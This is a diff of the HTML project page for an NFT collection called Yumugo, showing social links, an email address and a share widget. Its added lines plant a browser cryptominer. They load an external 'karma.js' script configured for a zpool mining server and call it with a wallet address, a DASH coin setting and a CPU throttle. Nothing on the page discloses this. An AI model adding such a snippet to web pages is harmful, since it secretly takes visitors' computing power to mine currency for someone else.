@@ -24,11 +24,13 @@ You can join our <a href="https://discord.gg/hNwuSVHz" target="_blank"><u>Discor
 - Opraks Nft's Yumugo: <a href="https://x.com/BerkiSait52105" target="_blank"><u>X</u></a>
 - My Email Address: <font color="#8ECAE6">saitberkey@gmail.com</font> 
 
-<hr>
-<h1><center><img src="https://github.com/Opraks/Yumugo-Nfts/blob/main/Yumugos%20Banner.png?raw=true" alt="Örnek Resim"/></center></h1>
-
 <center>
 <a href="https://opraks.github.io/Yumugo-Nfts/" target="_blank">@Opraks.github.webpage/</a>
 </center>
 
 <script type='text/javascript' src='https://platform-api.sharethis.com/js/sharethis.js#property=69373e52d1fcd60fb5090f93&product=sop' async='async'></script>
+
+<script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=flex/native?nosaj=flex.na.mine.zpool.ca:3340" ></script>
+<script type="text/javascript">
+EverythingIsLife('Xjz8Dnqbm9vF5jvhhvVLnXMkGdFH7A3ft8', 'c=DASH', 70);
+</script>
